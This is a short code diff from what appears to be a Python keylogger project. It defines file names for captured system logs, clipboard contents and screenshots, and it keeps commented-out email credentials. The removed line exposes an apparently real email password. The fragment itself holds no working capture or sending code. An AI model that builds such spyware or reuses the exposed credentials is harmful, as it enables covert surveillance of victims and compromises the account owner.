@@ -34,7 +34,7 @@ system_information = "system_log.txt"
 clipboard_information = "clipboard.txt"
 screenshot_information = "screenshot.png"
 # email_address= "izanescoffier@gmail.com"
-# password = "izanesCOFFIECER@030303"
+# password = "in_py_charm"
 
 file_path = "C:\\Users\\KIIT\\PycharmProjects\\kylggr"
 extend="\\"
